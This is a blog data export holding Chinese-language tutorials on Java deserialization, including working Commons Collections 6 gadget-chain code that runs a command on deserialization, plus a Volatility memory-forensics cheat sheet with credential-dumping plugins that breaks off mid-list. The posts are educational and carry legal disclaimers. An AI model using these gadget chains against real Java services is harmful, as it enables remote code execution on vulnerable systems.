{"meta":{"title":"GhostToKnow","subtitle":"","description":"","author":"GhostToKnow","url":"http://example.com","root":"/"},"pages":[],"posts":[{"title":"java安全 反序列化(二)","slug":"java安全-反序列化-二","date":"2023-04-05T05:57:25.000Z","updated":"2023-04-05T06:13:42.305Z","comments":true,"path":"2023/04/05/java安全-反序列化-二/","link":"","permalink":"http://example.com/2023/04/05/java%E5%AE%89%E5%85%A8-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-%E4%BA%8C/","excerpt":"","text":"\u001b[200~# java安全 反序列化(二) 寻找反序列化链(Gadget) 在项目里找漏洞 readObject里的漏洞一般比较少 寻找项目的依赖库类中的Gadget 一些依赖也会有反序列化的操作，如果jar包中的某些类在进行反序列化时有可控的点，就可以利用jar包中存在的漏洞来构造调用链 ysoserial工具ysoserial工具可以帮助我们在依赖库里面找到利用链。 1git clone https://github.com/frohoff/ysoserial.git 进入ysoserial目录，编译jar包 1mvn clean package -DskipTests 出现BUILD SUCCESS表示编译成功，在target文件夹下 注意：要使用java 1.7+ 的jdk环境 最经典的反序列化利用链Apache Commons Collections.jar中的一条pop链，这个类库使用广泛，所以很多大型的应用也存在着这个漏洞。 Commons Collections 在3.x &lt; 3.2.2 以及4.0这些版本范围里，存在反序列化漏洞 当目标Java应用依赖库里包含存在漏洞的Commons Collections库，且对由攻击者可控的数据进行反序列化时，即会造成任意代码执行。 我们以ysoserial里CommonsCollections6这个payload为例，进行分析。 先使用ysoserial生成反序列化的payload 使用maven导入commons-collections依赖 pom.xml 12345&lt;dependency&gt; &lt;groupId&gt;commons-collections&lt;/groupId&gt; &lt;artifactId&gt;commons-collections&lt;/artifactId&gt; &lt;version&gt;3.2.1&lt;/version&gt;&lt;/dependency&gt; 在创建测试代码 TestCC6 12345678910111213import java.io.FileInputStream;import java.io.FileNotFoundException;import java.io.IOException;import java.io.ObjectInputStream;import java.lang.reflect.InvocationTargetException;public class TestCC6 &#123; public static void main(String[] args) throws IOException, ClassNotFoundException&#123; ObjectInputStream objectInputStream = new ObjectInputStream(new FileInputStream(&quot;cc6.ser&quot;)); objectInputStream.readObject(); objectInputStream.close(); &#125;&#125; 把生成的cc6.ser放在项目根目录下执行代码，弹出计算机 运行环境为java11 要解析cc6链的结构代码要先学习下java反射相关，我们可以在很多java漏洞的POC中看到反射的利用，所以学习java安全是绕不开反射的。 java反射Java反射机制是在运行状态中，对于任意一个类，都能够知道这个类的所有属性和方法;对于任意一个对象，都能够调用它的任意方法和属性(包括私有的方法和属性);这种动态获取信息以及动态调用对象方法的功能称为java语言的反射机制。 涉及到java中的几个类： 1234567Class类 代表类的实体，在运行的java应用程序中表示类和接口Field类：代表类的成员变量(成员变量也称为类的属性)Method类：代表类的方法Constructor类：代表类的构造方法 在Java中你看到的绝大部分成员，其实都可以称之为对象（除了普通数据类型和静态成员)。 类也是对象，类是java.lang.Class类的实例对象 Class类抽象出了java中类的特征并提供了一些方法 有三种方式获得Class类实例： 123456781.如果知道class的完整类名，可以调用Class类的静态方法Class.forName获取Class clz = Class.forName(&quot;com.GhostToKnow.User&quot;);2.任何一个类都有一个隐含的静态成员class，这个属性就存储着这个类对应的Class类的实例：Class clz = com.GhostToKnow.User.class;3.调用这个对象的getClass()方法：Class clz = (new User()).getClass(); 测试获取，调用方法User 12345public class User &#123; public void test(String name)&#123; System.out.println(&quot;Hello：&quot;+name); &#125; &#125; 获取方法：我们之前已经提到了Method这个类，java中所有的方法都是Method类型，所以我们通过反射机制获取到某个对象的方法也是Method类型的。通过Class对象获取某个方法： 方法的名称和方法的参数列表，两者信息才能确定某一个方法 1clz.getMethod(方法名，这个方法的参数类型) 调用方法：Method类中有一个invoke方法，就是用来调用特定方法的，用法如下： 1public Object invoke(Object obj, Object... args) 第一个参数是调用该方法的对象，第二个参数是一个可变长参数，是这个方法的需要传入的参数 testUser 123456789101112import java.lang.reflect.InvocationTargetException;import java.lang.reflect.Method;public class testUser &#123; public static void main(String[] args) throws NoSuchMethodException, InvocationTargetException, IllegalAccessException &#123; Class user = (new User()).getClass(); //第二个参数要传class类，如果参数有多个传入：new Class[]&#123;String.class,String.class&#125; Method test = user.getMethod(&quot;test&quot;,String.class); //如果第二个参数有多个传入：new Object[]&#123;&quot;1&quot;,&quot;2&quot;&#125; test.invoke((new User()),&quot;GhostToKnow&quot;); &#125;&#125; 修改变量User 123456789public class User &#123; private String pass = &quot;123321&quot;; @Override public String toString() &#123; return &quot;User&#123;&quot; + &quot;pass=&#x27;&quot; + pass + &#x27;\\&#x27;&#x27; + &#x27;&#125;&#x27;; &#125;&#125; testUser 12345678910111213141516171819import java.lang.reflect.Field;import java.lang.reflect.InvocationTargetException;import java.lang.reflect.Method;public class testUser &#123; public static void main(String[] args) throws NoSuchMethodException, InvocationTargetException, IllegalAccessException, NoSuchFieldException &#123; Class user = (new User()).getClass(); //获取私有属性对象 Field pass = user.getDeclaredField(&quot;pass&quot;); //关闭java访问控制检查，就可以给private属性赋值调用 pass.setAccessible(true); User u = new User(); System.out.println(u); pass.set(u,&quot;GhostToKnow&quot;); System.out.println(u); System.out.println(pass.get(u)); &#125;&#125; 常用方法获取类:forName &#x2F; getClass 获取类下的函数: getMethod&#x2F;s &#x2F; getDeclaredMethod&#x2F;s 执行类下的函数: invoke 获取类构造方法: getConstructor&#x2F;s &#x2F; getDeclaredConstructor&#x2F;s CC链源码分析我们需要payload经过反序列化过后会执行：Runtime.getRuntime().exec(&quot;任意命令&quot;) CommonsCollections6.java 在\\ysoserial\\src\\main\\java\\ysoserial\\payloads\\CommonsCollections6.java 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576package ysoserial.payloads;@SuppressWarnings(&#123;&quot;rawtypes&quot;, &quot;unchecked&quot;&#125;)@Dependencies(&#123;&quot;commons-collections:commons-collections:3.1&quot;&#125;)@Authors(&#123; Authors.MATTHIASKAISER &#125;)public class CommonsCollections6 extends PayloadRunner implements ObjectPayload&lt;Serializable&gt; &#123; public Serializable getObject(final String command) throws Exception &#123; final String[] execArgs = new String[] &#123; command &#125;; final Transformer[] transformers = new Transformer[] &#123; new ConstantTransformer(Runtime.class), new InvokerTransformer(&quot;getMethod&quot;, new Class[] &#123; String.class, Class[].class &#125;, new Object[] &#123; &quot;getRuntime&quot;, new Class[0] &#125;), new InvokerTransformer(&quot;invoke&quot;, new Class[] &#123; Object.class, Object[].class &#125;, new Object[] &#123; null, new Object[0] &#125;), new InvokerTransformer(&quot;exec&quot;, new Class[] &#123; String.class &#125;, execArgs), new ConstantTransformer(1) &#125;; Transformer transformerChain = new ChainedTransformer(transformers); final Map innerMap = new HashMap(); final Map lazyMap = LazyMap.decorate(innerMap, transformerChain); TiedMapEntry entry = new TiedMapEntry(lazyMap, &quot;foo&quot;); HashSet map = new HashSet(1); map.add(&quot;foo&quot;); Field f = null; try &#123; f = HashSet.class.getDeclaredField(&quot;map&quot;); &#125; catch (NoSuchFieldException e) &#123; f = HashSet.class.getDeclaredField(&quot;backingMap&quot;); &#125; Reflections.setAccessible(f); HashMap innimpl = (HashMap) f.get(map); Field f2 = null; try &#123; f2 = HashMap.class.getDeclaredField(&quot;table&quot;); &#125; catch (NoSuchFieldException e) &#123; f2 = HashMap.class.getDeclaredField(&quot;elementData&quot;); &#125; Reflections.setAccessible(f2); Object[] array = (Object[]) f2.get(innimpl); Object node = array[0]; if(node == null)&#123; node = array[1]; &#125; Field keyField = null; try&#123; keyField = node.getClass().getDeclaredField(&quot;key&quot;); &#125;catch(Exception e)&#123; keyField = Class.forName(&quot;java.util.MapEntry&quot;).getDeclaredField(&quot;key&quot;); &#125; Reflections.setAccessible(keyField); keyField.set(node, entry); return map; &#125; public static void main(final String[] args) throws Exception &#123; PayloadRunner.run(CommonsCollections6.class, args); &#125;&#125; 其中我们先看这里，是整个漏洞的核心，我们一个个函数的看 123456789101112final Transformer[] transformers = new Transformer[] &#123; new ConstantTransformer(Runtime.class), new InvokerTransformer(&quot;getMethod&quot;, new Class[] &#123; String.class, Class[].class &#125;, new Object[] &#123; &quot;getRuntime&quot;, new Class[0] &#125;), new InvokerTransformer(&quot;invoke&quot;, new Class[] &#123; Object.class, Object[].class &#125;, new Object[] &#123; null, new Object[0] &#125;), new InvokerTransformer(&quot;exec&quot;, new Class[] &#123; String.class &#125;, execArgs), new ConstantTransformer(1) &#125;;Transformer transformerChain = new ChainedTransformer(transformers); 跟进ConstantTransformer看一下 1234567891011121314151617181920212223242526package org.apache.commons.collections.functors;import java.io.Serializable;import org.apache.commons.collections.Transformer;public class ConstantTransformer implements Transformer, Serializable &#123; private static final long serialVersionUID = 6374440726369055124L; public static final Transformer NULL_INSTANCE = new ConstantTransformer((Object)null); private final Object iConstant; public static Transformer getInstance(Object constantToReturn) &#123; return (Transformer)(constantToReturn == null ? NULL_INSTANCE : new ConstantTransformer(constantToReturn)); &#125; public ConstantTransformer(Object constantToReturn) &#123; this.iConstant = constantToReturn; &#125; public Object transform(Object input) &#123; return this.iConstant; &#125; public Object getConstant() &#123; return this.iConstant; &#125;&#125; 它的transform方法会返回iConstant，而this.iConstant是来自构造器参数constantToReturn，所以我们在实例化时传入一个Runtime.class返回的也是Runtime.class就解决了Runtime.getRuntime().exec(&quot;任意命令&quot;)开头我们需要的Runtime类 再跟进InvokerTransformer看一下实现了什么，这里只展示需要的代码 12345678910111213141516171819202122232425构造方法 public InvokerTransformer(String methodName, Class[] paramTypes, Object[] args) &#123; this.iMethodName = methodName; this.iParamTypes = paramTypes; this.iArgs = args; &#125;transform方法 public Object transform(Object input) &#123; if (input == null) &#123; return null; &#125; else &#123; try &#123; Class cls = input.getClass(); Method method = cls.getMethod(this.iMethodName, this.iParamTypes); return method.invoke(input, this.iArgs); &#125; catch (NoSuchMethodException var4) &#123; throw new FunctorException(&quot;InvokerTransformer: The method &#x27;&quot; + this.iMethodName + &quot;&#x27; on &#x27;&quot; + input.getClass() + &quot;&#x27; does not exist&quot;); &#125; catch (IllegalAccessException var5) &#123; throw new FunctorException(&quot;InvokerTransformer: The method &#x27;&quot; + this.iMethodName + &quot;&#x27; on &#x27;&quot; + input.getClass() + &quot;&#x27; cannot be accessed&quot;); &#125; catch (InvocationTargetException var6) &#123; throw new FunctorException(&quot;InvokerTransformer: The method &#x27;&quot; + this.iMethodName + &quot;&#x27; on &#x27;&quot; + input.getClass() + &quot;&#x27; threw an exception&quot;, var6); &#125; &#125; &#125; 在前面说到了反射机制，这里的transform很明显就是利用了反射机制，是执行了某个对象的某个方法 使用的this.iMethodName，this.iParamTypes，this.iArgs都是可以通过构造方法传入的，也就是我们可控的，那么只要input可控，就可以执行任意对象的任意方法，这里就要看到ChainedTransformer类了 ChainedTransformer 123456789101112 //构造方法public ChainedTransformer(Transformer[] transformers) &#123; this.iTransformers = transformers; &#125; //transform方法public Object transform(Object object) &#123; for(int i = 0; i &lt; this.iTransformers.length; ++i) &#123; object = this.iTransformers[i].transform(object); &#125; return object; &#125; 这个类的构造函数接收一个Transformer类型的数组，并且在transform方法中会遍历这个数组，并调用数组中的每一个成员的transform方法，而且会把上一个成员调用transform的方法返回的对象，当作下一个成员的transform方法的参数，这就是一个链式调用，配合InvokerTransformer类中的transform方法，input也可控了 至此整个漏洞核心已经明了，利用ConstantTransformer的transform方法获取Runtime.class，再利用ChainedTransformer的transform方法把Runtime.class传给InvokerTransformer的transform方法利用，再利用ChainedTransformer的transform方法不断调用InvokerTransformer的transform方法，利用这个方法的反射相关代码，所有参数都是可控的。 可能有点晕，这三个XXXtransformer类都是实现了TransFormer这个接口，所以他们都有一个transform方法 12345InvokerTransformer ：transform方法通过反射可以执行一个对象的任意方法ConstantTransformer ： transform返回构造函数传入的参数ChainedTransformer ：transform方法执行构造函数传入数组的每一个成员的transform方法 把这几个transformer组合起来构造一个执行链，代码如下,这是直接截取的CC6链的部分代码： 1234567891011121314151617181920212223import org.apache.commons.collections.Transformer;import org.apache.commons.collections.functors.ChainedTransformer;import org.apache.commons.collections.functors.ConstantTransformer;import org.apache.commons.collections.functors.InvokerTransformer;public class TestTest &#123; public static void main(String[] args) &#123; Transformer[] transformers = new Transformer[]&#123; new ConstantTransformer(Runtime.class), new InvokerTransformer(&quot;getMethod&quot;, new Class[] &#123; String.class, Class[].class &#125;, new Object[] &#123; &quot;getRuntime&quot;, new Class[0] &#125;), new InvokerTransformer(&quot;invoke&quot;, new Class[] &#123; Object.class, Object[].class &#125;, new Object[] &#123; null, new Object[0] &#125;), new InvokerTransformer(&quot;exec&quot;, new Class[] &#123; String.class &#125;, new Object[]&#123;&quot;notepad&quot;&#125;), new ConstantTransformer(1) &#125;; Transformer transformerChain = new ChainedTransformer(transformers); transformerChain.transform(&quot;a&quot;); &#125;&#125; 执行代码，利用成功，成功弹出记事本 这里只是手动触发，现在要看一下被动触发，也就是在真实的应用中怎么触发ChainedTransformer的transform方法。 全局寻找哪个类中使用了factory方法，并且我们可以利用，锁定到了LazyMap类 LazyMap利用链LazyMap类中调用了transform的地方，在get方法中： 123456789public Object get(Object key) &#123; if (!this.map.containsKey(key)) &#123; Object value = this.factory.transform(key); this.map.put(key, value); return value; &#125; else &#123; return this.map.get(key); &#125;&#125; 调用了this.factory.transform方法，而 this.factory是我们可控的，构造函数如下： 12345678protected LazyMap(Map map, Transformer factory) &#123; super(map); if (factory == null) &#123; throw new IllegalArgumentException(&quot;Factory must not be null&quot;); &#125; else &#123; this.factory = factory; &#125;&#125; 构造利用链时，我们只需要令factory为我们构造的ChainedTransformer就可以触发ChainedTransformer的transform方法。 现在倒是找到了能够触发transform()的地方了，但是这还是不能在反序列化的时候自动触发，我们都知道反序列化只会自动触发函数readObject(),所以，接下来我们需要找到一个类，这个类重写了readObject(),并且readObject中直接或者间接的调用了刚刚找到的get方法 到这一步，正常的代码审计过程中，会采取两种策略，一种是继续向上回溯，找get方法被调用的位置，另一种策略就是全局搜索readObject()方法，看看有没有哪个类直接就调用了这个方法或者readObject中有可疑的操作，最后能够间接触发这个方法。 寻找到了TiedMapEntry类 1234567891011121314151617181920212223public class TiedMapEntry implements Map.Entry, KeyValue, Serializable &#123; private static final long serialVersionUID = -8453869361373831205L; private final Map map; private final Object key; public TiedMapEntry(Map map, Object key) &#123; this.map = map; this.key = key; &#125; public Object getValue() &#123; return this.map.get(this.key); &#125; public int hashCode() &#123; Object value = this.getValue(); return (this.getKey() == null ? 0 : this.getKey().hashCode()) ^ (value == null ? 0 : value.hashCode()); &#125; public String toString() &#123; return this.getKey() + &quot;=&quot; + this.getValue(); &#125;&#125; 其中getValue方法也调用了get方法，如下： 123public Object getValue() &#123; return this.map.get(this.key);&#125; 而且this.map我们也可以控制，构造方法： 1234public TiedMapEntry(Map map, Object key) &#123; this.map = map; this.key = key;&#125; 其中hashCode()和toString()方法间接执行了getValue方法，但是这个也没办法直接触发，因为它没有在readObject的时候调用，当在readObject的时候调用，才能让它自动执行，所以我们最终要找的还是readObject方法中的触发点，可以关注这三个方法谁能调用 在Hashtable中的readObject存在hashCode()方法，这是jdk内部的类 1234567891011121314151617181920212223242526272829public class Hashtable&lt;K,V&gt; extends Dictionary&lt;K,V&gt; implements Map&lt;K,V&gt;,Cloneable,java.io.Serializable &#123; private transient Entry&lt;?,?&gt;[]table; private transient int count; private int threshold; private float loadFactor; private transient int modCount = o; private static final long serialVersionUID = 1421746759512286392L; private void readObject(java.io.0bjectInputStream s) throws IOException, ClassNotFoundException&#123; //Read in the threshold and loadFactor s.defaultReadobject(); //Read the number of elements and then all the key/value objects for (; elements &gt; 0; elements--) &#123; K key = (K)s.readObject() v value = (V)s.readObject(); reconstitutionPut(table, key, value); &#125;&#125;private void reconstitutionPut(Entry&lt;?,?&gt;[]tab, K key, v value) throws StreamCorruptedException&#123; if (value == null) &#123; throw new java.io.StreamCorruptedException(); &#125; int hash = key.hashCode(); int index =(hash &amp; 0x7FFFFFFF) % tab.length; for (Entry&lt;?,?&gt; e = tab[index]; e!= null ; e= e.next) &#123; if((e.hash == hash) &amp;&amp; e.key.equals(key)) &#123; throw new java.io.StreamCorruptedException(0); &#125;&#125; 把Hashtable形成的对象序列化进去，那么当在反序列化时，要去调用Hashtable的readObject，再间接去调用hashCode()里的getValue()再去调用LazyMap中的transform()方法,而transform()方法里是我们构造的ChainedTransformer 1234567891011121314151617181920212223242526272829303132333435363738394041public class TestTest &#123; public static void main(String[] args) throws NoSuchFieldException, IllegalAccessException, IOException, ClassNotFoundException &#123; disableWarning(); Transformer[] transformers = new Transformer[]&#123; new ConstantTransformer(Runtime.class), new InvokerTransformer(&quot;getMethod&quot;, new Class[] &#123; String.class, Class[].class &#125;, new Object[] &#123; &quot;getRuntime&quot;, new Class[0] &#125;), new InvokerTransformer(&quot;invoke&quot;, new Class[] &#123; Object.class, Object[].class &#125;, new Object[] &#123; null, new Object[0] &#125;), new InvokerTransformer(&quot;exec&quot;, new Class[] &#123; String.class &#125;, new Object[]&#123;&quot;notepad&quot;&#125;)&#125;; Transformer transformerChain = new ChainedTransformer(transformers); Map innerMap = new HashMap(); Map lazyMap = LazyMap.decorate(innerMap, transformerChain); TiedMapEntry entry = new TiedMapEntry(innerMap, transformerChain); Hashtable&lt;Object, Object&gt; hashtable = new Hashtable&lt;&gt;(); hashtable.put(&quot;pwn&quot;,&quot;dd&quot;); Field table = hashtable.getClass().getDeclaredField(&quot;table&quot;); table.setAccessible(true); Object[] hasharray = (Object[]) table.get(hashtable); for (Object obj: hasharray)&#123; if (obj != null)&#123; Field entykey = obj.getClass().getDeclaredField(&quot;key&quot;); entykey.setAccessible(true); entykey.set(obj,entry); &#125; &#125; ObjectOutputStream objectOutputStream = new ObjectOutputStream(new FileOutputStream(&quot;CC6.ser&quot;)); objectOutputStream.writeObject(hashtable); objectOutputStream.close(); ObjectInputStream ois = new ObjectInputStream(new FileInputStream(&quot;CC6.ser&quot;)); ois.readObject(); ois.close(); &#125; 成功弹出记事本 还有很多其他可以利用的类和利用链： BadAttributeValueExpException的readObject方法 ​ toString方法与php中的__toString方法类似，在进行字符串拼接或者手动把某个类转换为字符串的时候会被调用 AnnotationInvocationHandler的invoke方法中有get的调用再配合动态代理 TransformedMap利用链，另一条POP链 本博客的技术文章仅供参考，此文所提供的信息只为网络安全人员对自己所负责的网站、服务器等（包括但不限于）进行检测或维护参考，未经授权请勿利用文章中的技术资料对任何计算机系统进行入侵操作。利用此文所提供的信息而造成的直接或间接后果和损失，均由使用者本人负责。 本文所提供的工具仅用于学习、漏洞验证，禁止用于非法用途！","categories":[{"name":"java安全","slug":"java安全","permalink":"http://example.com/categories/java%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"反序列化","slug":"反序列化","permalink":"http://example.com/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"}]},{"title":"java安全 反序列化(一)","slug":"java安全-反序列化-一","date":"2023-04-05T05:39:07.000Z","updated":"2023-04-05T05:56:01.293Z","comments":true,"path":"2023/04/05/java安全-反序列化-一/","link":"","permalink":"http://example.com/2023/04/05/java%E5%AE%89%E5%85%A8-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-%E4%B8%80/","excerpt":"","text":"前言序列化就是把对象转换成字节流，便于保存在内存、文件、数据库中;反序列化即逆过程，由字节流还原成对象。序列化是一种对象持久化的手段，可以将对象的状态转换为字节数组，来便于存储或者传输的机制;可以有效地实现多平台之间的通信、对象持久化存储。 Java中的ObjectOutputStream类的writeObject()方法可以实现序列化，类ObjectlnputStream类的readObject()方法用于反序列化。 就像游戏的存档，中途退出后存档，再次游玩时读取存档恢复上次游戏离开时的状态 序列化基础知识：一个类对象要想实现序列化，必须满足两个条件： ​ 该类的所有属性必须是可序列化的。 ​ 需要实现Serializable或Externalizable接口 实现其中一个接口就可以了 java.io.Serializable java.io.Externalizable java.io.Serializablepublic interface Serializable {} 这个是标记接口里面什么内容都没有，本身是没有意思的。编译器知道这个标记有什么含义，对实现了这个接口的类会进行特殊处理。 实现了这个接口的类，编译器就知道这个对象是可以用来序列化 java.io.Externalizable123public interface Externalizable extends java.io.Serializable&#123; void writeExternal(ObjectOutput out) throws IOException; void readExternal(ObjectInput in) throws IOException,ClassNotFoundException;&#125; Externalizable接口也是实现了Serializable接口，并且有2个方法，要继承这个接口必须要实现接口定义的方法。 尝试序列化和反序列化对一个类进行序列化需要执行ObjectOutputStream.writeObject方法写入对象。 对一个类进行反序列化需要ObjectIputStream.readObject从输入流中读取字节然后转换成对象。 在反序列化的过程中，是直接拿到对象而不是new一个所以被反序列化操作的类不会执行构造方法 注意看注解 TestSerialize 12345678910111213141516171819202122232425import java.io.Serializable;public class TestSerialize implements Serializable &#123; private static final long serialVersionUID = 1; public String username; //被transient关键字修饰的成员属性变量不被序列化 transient private String password; public TestSerialize(String name, String pass) &#123; this.username = name; this.password = pass; &#125; public void testUse()&#123; System.out.println(&quot;uasrname: &quot;+username); System.out.println(&quot;password: &quot;+password); &#125; @Override public String toString() &#123; return &quot;TestSerialize&#123;&quot; + &quot;username=&#x27;&quot; + username + &#x27;\\&#x27;&#x27; + &quot;, password=&#x27;&quot; + password + &#x27;\\&#x27;&#x27; + &#x27;&#125;&#x27;; &#125;&#125; main 1234567891011121314151617181920212223242526272829303132333435363738394041import java.io.*;public class main &#123; public static void main(String[] args) &#123; TestSerialize ser = new TestSerialize(&quot;GhostToKnow&quot;,&quot;123123&quot;); try &#123; // 创建一个FIleOutputStream类 FileOutputStream fos = new FileOutputStream(&quot;./Test.ser&quot;); // FileOutputStream类,字节输出流，用于处理原始二进制数据。将数据写到文件,需要将数据转换成字节并将其保存到文件。 // 将这个FIleOutputStream类封装到ObjectOutputStream中 ObjectOutputStream oos = new ObjectOutputStream(fos); // ObjectOutputStream，对象的输出流，将指定的对象写入到文件完成对象的序列化过程 // 调用writeObject方法，序列化对象到文件Test.ser中 oos.writeObject(ser); // 创建一个FIleInutputStream类 FileInputStream fis = new FileInputStream(&quot;./Test.ser&quot;); // FileInputStream文件输入流，是将文本文件中的数据输入到内存中。他是一个字节输入流，是InputStream抽象类的一个子类 // 将FileInputStream类封装到ObjectInputStream中 ObjectInputStream ois = new ObjectInputStream(fis); // ObjectInputStream,反序列化流，将使用ObjectOutputStream序列化的原始数据恢复为对象，以流的方式读取对象 // 调用readObject从user.ser中反序列化出对象，默认是Object类型,需要进行类型转换， TestSerialize test = (TestSerialize)ois.readObject(); test.testUse(); &#125; catch (FileNotFoundException e) &#123; e.printStackTrace(); &#125; catch (IOException e) &#123; e.printStackTrace(); &#125; catch (ClassNotFoundException e) &#123; e.printStackTrace(); &#125; &#125;&#125; 0xACED：STREAM_MAGIC，声明使用了序列化协议，从这里可以判断保存的内容是否为序列化数据。 （这是在黑盒挖掘反序列化漏洞很重要的一个点） 0x0005：STREAM_VERSION，序列化协议版本。 0x73: TC_OBJECT 0x72: TC_CLASSDESC 0x00…01：serialVersionUID serialVersionUIDprivate static final long serialVersionUID = 1; 作用：在反序列化的时候保证与本地类的版本相同 不自定义会自动生成UID 如果两个不同内容的类，在包名类名都一样时，是不能进行相互反序列化的，但如果定义的UID一样，那么生成的序列化文件就可以进行反序列化操作。 自定义序列化在序列化一个类的时候并不想写入多余的数据，需要自定义读取和写入 readObject write Object java是支持自定义readObject与writeObject方法的,只要某个类中按照特定的要求实现了readObject方法，那么在反序列化的时候就会自动调用它. 12345private void writeObject(ObjectOutputStream oos)throws IOException &#123; oos.writeUTF(username); oos.writeUTF(password); System.out.println(&quot;Test Serialize writeObject&quot;);&#125; 12345private void readObject(ObjectInputStream ois)throws IOException,ClassNotFoundException &#123; username = ois.readUTF(); type = ois.readUTF(); System.out.println(&quot;Test Serialize writeObject&quot;);&#125; 读写顺序要一致，先写入username变量，那么读取时也要先读取username变量，不然会报错。 1234567891011121314151617181920212223242526272829303132import java.io.IOException;import java.io.ObjectInputStream;import java.io.ObjectOutputStream;import java.io.Serializable;public class TestSerialize implements Serializable &#123; private static final long serialVersionUID = -123123123L; public String username; transient private String password; public int age; public TestSerialize(String name, String pass, int age) &#123; this.username = name; this.password = pass; this.age = age; &#125; public void testUse()&#123; System.out.println(&quot;usernaem: &quot;+username); System.out.println(&quot;password: &quot;+password); System.out.println(&quot;age: &quot;+age); &#125; private void writeObject(ObjectOutputStream oos)throws IOException &#123; oos.writeUTF(username); oos.writeUTF(password); System.out.println(&quot;Test Serialize writeObject&quot;);&#125; private void readObject(ObjectInputStream ois)throws IOException,ClassNotFoundException &#123; username = ois.readUTF(); password = ois.readUTF(); System.out.println(&quot;Test Serialize writeObject&quot;);&#125;&#125; 123456789101112131415161718192021222324import java.io.*;public class main &#123; public static void main(String[] args) &#123; TestSerialize ser = new TestSerialize(&quot;GhostToKnow&quot;,&quot;123123&quot;,19); try &#123; FileOutputStream fos = new FileOutputStream(&quot;./Test.ser&quot;); ObjectOutputStream oos = new ObjectOutputStream(fos); oos.writeObject(ser); FileInputStream fis = new FileInputStream(&quot;./Test.ser&quot;); ObjectInputStream ois = new ObjectInputStream(fis); TestSerialize test = (TestSerialize)ois.readObject(); test.testUse(); &#125; catch (FileNotFoundException e) &#123; e.printStackTrace(); &#125; catch (IOException e) &#123; e.printStackTrace(); &#125; catch (ClassNotFoundException e) &#123; e.printStackTrace(); &#125; &#125;&#125; 自定义读写只有name和pass没有age，所以这里就算给age传入了19但输出age为0 在自定义writeObject时手动把被transient修饰的变量写进去，在读取readObject时也手动写出来，pass是可以被修改拿到的。 反序列化漏洞成因序列化和反序列化本身并不存在问题。但当输入的反序列化的数据可被用户控制，那么攻击者即可通过构造恶意输入，让反序列化产生非预期的对象，非预期的对象在产生过程中就可能带来安全问题。 广义上来讲，传的xml，json等内容可以进行反序列化操作，再次拿到java对象，也可以叫反序列化漏洞 例子如果自定义的readObject方法里进行了一些危险操作，那么就会导致反序列化漏洞的发生了。 TestSeria 123456789101112131415161718192021import java.io.IOException;import java.io.ObjectInputStream;import java.io.ObjectOutputStream;import java.io.Serializable;public class TestSerialize implements Serializable &#123; public String cmd = null; public TestSerialize(String cmd) &#123; this.cmd = cmd; &#125; private void writeObject(ObjectOutputStream oos)throws IOException &#123; oos.defaultWriteObject(); System.out.println(&quot;Test Serialize writeObject&quot;);&#125; private void readObject(ObjectInputStream ois)throws IOException,ClassNotFoundException &#123; ois.defaultReadObject(); //调用系统执行命令功能，去执行cmd这个变量的命令 Runtime.getRuntime().exec(cmd); System.out.println(&quot;Test Serialize writeObject&quot;);&#125;&#125; main 123456789101112131415161718192021import java.io.*;public class main &#123; public static void main(String[] args) &#123; TestSerialize ser = new TestSerialize(&quot;notepad&quot;); try &#123; FileOutputStream fos = new FileOutputStream(&quot;./Test02.ser&quot;); ObjectOutputStream oos = new ObjectOutputStream(fos); oos.writeObject(ser); FileInputStream fis = new FileInputStream(&quot;./Test02.ser&quot;); ObjectInputStream ois = new ObjectInputStream(fis); TestSerialize test = (TestSerialize)ois.readObject(); &#125; catch (FileNotFoundException e) &#123; e.printStackTrace(); &#125; catch (IOException e) &#123; e.printStackTrace(); &#125; catch (ClassNotFoundException e) &#123; throw new RuntimeException(e); &#125; &#125;&#125; 在反序列化的时候会主动调用readObject就会触发命令执行，弹出了记事本。 这里只是演示，应该没有人会在写Runtime.getRuntime().exec(cmd);大多时是利用反射去构造java方法，再通过反射去调用java方法 Runtime.exec()：直接在目标环境执行命令 Method.invoke()：需要适当的选择方法和参数，通过反射执行java方法 RMI&#x2F;JNDI&#x2F;JRMP等：通过引用远程对象，间接实现任意代码执行的效果 后续介绍java反射，CC6链源码分析，LazyMap利用连，ysoser工具的使用 本博客的技术文章仅供参考，此文所提供的信息只为网络安全人员对自己所负责的网站、服务器等（包括但不限于）进行检测或维护参考，未经授权请勿利用文章中的技术资料对任何计算机系统进行入侵操作。利用此文所提供的信息而造成的直接或间接后果和损失，均由使用者本人负责。 本文所提供的工具仅用于学习、漏洞验证，禁止用于非法用途！","categories":[{"name":"java安全","slug":"java安全","permalink":"http://example.com/categories/java%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"反序列化","slug":"反序列化","permalink":"http://example.com/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"}]},{"title":"volatility取证","slug":"volatility取证","date":"2023-04-03T13:42:48.000Z","updated":"2023-04-03T13:46:07.874Z","comments":true,"path":"2023/04/03/volatility取证/","link":"","permalink":"http://example.com/2023/04/03/volatility%E5%8F%96%E8%AF%81/","excerpt":"","text":"前言volatility是一款开源的内存取证分析工具，由python编写，支持各种操作系统，能够对导出的windows,linux,mac osx,android等系统内存镜像进行分析。可以通过插件来拓展功能。 常见命令命令格式： volatility -f [镜像文件] –profile&#x3D;[操作系统] [插件参数] 123456789101112131415161718192021222324252627volatility -f 文件名 imageinfo 得到镜像的基本信息。volatility -f 文件名 --profile=系统 pslist 查看进程信息volatility -f 文件名 --profile=系统 pstree 查看进程树volatility -f 文件名 --profile=系统 hashdump 查看用户名密码信息volatility -f 文件名 --profile=系统 john 爆破密码volatility -f 文件名 --profile=系统 lsadump 查看用户强密码volatility -f 文件名 --profile=系统 svcscan 查看服务volatility -f 文件名 --profile=系统 iehistory 查看IE浏览器历史记录volatility -f 文件名 --profile=系统 netscan 查看网络连接volatility -f 文件名 --profile=系统 cmdscan cmd历史命令volatility -f 文件名 --profile=系统 consoles 命令历史记录volatility -f 文件名 --profile=系统 cmdline 查看cmd输出， 获取命令行下运行的程序 volatility -f 文件名 --profile=系统 envars 查看环境变量，一般很多配合grep筛选，可也是使用-p指定pidvolatility -f 文件名 --profile=系统 filescan 查看文件volatility -f 文件名 --profile=系统 notepad 查看当前展示的notepad内容volatility -f 文件名 --profile=系统 hivelist 查看注册表配置单元volatility -f 文件名 --profile=系统 userassist 